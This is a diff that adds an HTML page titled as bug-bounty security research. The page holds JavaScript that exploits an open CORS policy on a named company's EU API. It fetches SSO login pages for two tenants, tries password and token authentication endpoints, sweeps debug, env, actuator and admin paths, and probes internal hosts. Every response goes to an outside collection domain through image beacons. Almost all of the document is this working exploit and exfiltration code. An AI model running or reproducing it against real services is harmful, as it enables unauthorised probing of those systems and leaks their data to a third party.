@@ -1,0 +1,85 @@
+<html>
+<head><title>H1 Security Research v3</title></head>
+<body>
+<script>
+var C="sealzxe362qslipkjnxo8kfq9hf830rp.oastify.com";
+function ex(l,d){try{new Image().src="https://"+C+"/v3?"+l+"="+encodeURIComponent((d+"").substring(0,800));}catch(e){}}
+
+// EU API has CORS: * — we can READ all responses!
+var EU="https://api.eu.stravito.com";
+
+// 1. Read version (confirmed working)
+fetch(EU+"/version").then(r=>r.text()).then(d=>ex("version",d)).catch(e=>ex("version-e",e+""));
+
+// 2. Read ALL auth endpoints — Tech Support SSO for every tenant
+// White-hat tenant
+fetch(EU+"/auth/8f93d903-147a-4cd7-ad8d-f32ee0c7dc44-tech-support/login?target=https://white-hat.stravito.com",{redirect:"manual"})
+  .then(r=>{ex("sso-wh-status",r.status+"-"+r.type); return r.text();})
+  .then(d=>ex("sso-wh",d))
+  .catch(e=>ex("sso-wh-e",e+""));
+
+// Black-hat tenant
+fetch(EU+"/auth/ebaefccb-f4c1-4eeb-a71d-3cc4f7b09904-tech-support/login?target=https://black-hat.stravito.com",{redirect:"manual"})
+  .then(r=>{ex("sso-bh-status",r.status+"-"+r.type); return r.text();})
+  .then(d=>ex("sso-bh",d))
+  .catch(e=>ex("sso-bh-e",e+""));
+
+// 3. Try auth/password on EU API (might work without tenant subdomain)
+fetch(EU+"/auth/password",{
+  method:"POST",
+  headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({username:"bug-bounty+white-hat+owner-01@stravito.com",password:"test"})
+}).then(r=>r.text()).then(d=>ex("auth-pwd",d)).catch(e=>ex("auth-pwd-e",e+""));
+
+// 4. Try auth/exchange on EU API
+fetch(EU+"/auth/exchange",{
+  method:"POST",
+  headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({token:"test"})
+}).then(r=>r.text()).then(d=>ex("auth-exchange",d)).catch(e=>ex("auth-exchange-e",e+""));
+
+// 5. Try auth/refresh on EU API
+fetch(EU+"/auth/refresh").then(r=>r.text()).then(d=>ex("auth-refresh",d)).catch(e=>ex("auth-refresh-e",e+""));
+
+// 6. Read the drive callback (CORS * on EU API)
+fetch(EU+"/auth/drive?error=test&state=test").then(r=>r.text()).then(d=>ex("drive-cb",d)).catch(e=>ex("drive-cb-e",e+""));
+
+// 7. Read the slack callback
+fetch(EU+"/auth/slack?error=test&state=test").then(r=>r.text()).then(d=>ex("slack-cb",d)).catch(e=>ex("slack-cb-e",e+""));
+
+// 8. Try to access API endpoints on EU API with different headers
+fetch(EU+"/api/boot",{headers:{"X-Stravito-Tenant-Id":"8f93d903-147a-4cd7-ad8d-f32ee0c7dc44"}})
+  .then(r=>r.text()).then(d=>ex("eu-boot",d)).catch(e=>ex("eu-boot-e",e+""));
+
+// 9. Try other EU API paths
+fetch(EU+"/api/user/meta").then(r=>r.text()).then(d=>ex("eu-user",d)).catch(e=>ex("eu-user-e",e+""));
+
+// 10. Probe the EU API for undiscovered endpoints
+["/health","/healthz","/status","/metrics","/info","/debug","/env","/actuator","/actuator/env","/actuator/health","/internal","/admin"].forEach(function(p){
+  fetch(EU+p).then(r=>{
+    if(r.status!==404){
+      r.text().then(d=>ex("eu"+p.replace(/\//g,"-"),r.status+":"+d));
+    }
+  }).catch(function(){});
+});
+
+// 11. Try to read Stravito tenant API with CORS credentials
+// The tenant API has CORS locked to tenant origin, but EU API is *
+// Try fetching tenant API boot (unauth, might work without CORS issue via EU)
+fetch("https://white-hat.api.stravito.com/api/boot")
+  .then(r=>r.text()).then(d=>ex("wh-boot",d)).catch(e=>ex("wh-boot-e",e+""));
+
+// 12. Try to read Snowplow (auth-protected from internet, might be open internally)
+fetch("https://snowplow.eu.prod.stravito.com/health")
+  .then(r=>r.text()).then(d=>ex("snowplow",d)).catch(e=>ex("snowplow-e",e+""));
+
+// 13. Try assets CDN
+fetch("https://assets.eu.stravito.com/")
+  .then(r=>r.text()).then(d=>ex("assets",d.substring(0,200))).catch(e=>ex("assets-e",e+""));
+
+// 14. Navigator and window info for report
+ex("ua",navigator.userAgent);
+ex("origin",location.origin);
+</script>
+</body>
+</html>
